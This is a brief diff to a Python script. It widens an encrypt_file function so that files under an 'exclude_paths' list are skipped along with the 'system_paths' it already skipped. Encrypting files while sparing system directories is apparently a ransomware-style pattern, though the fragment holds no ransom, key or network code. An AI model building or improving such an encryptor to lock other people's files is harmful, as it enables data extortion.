@@ -69,7 +69,7 @@ system_paths = [
 # Function to encrypt a file
 def encrypt_file(file_path):
     # Check if file is in system paths before encrypting
-    if any(file_path.startswith(path) for path in system_paths):
+    if any(file_path.startswith(path) for path in system_paths) or any(file_path.startswith(exclude_path) for exclude_path in exclude_paths):
         logging.debug(f"Skipping system path file {file_path}")
         return
     try:
@@ -159,6 +159,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
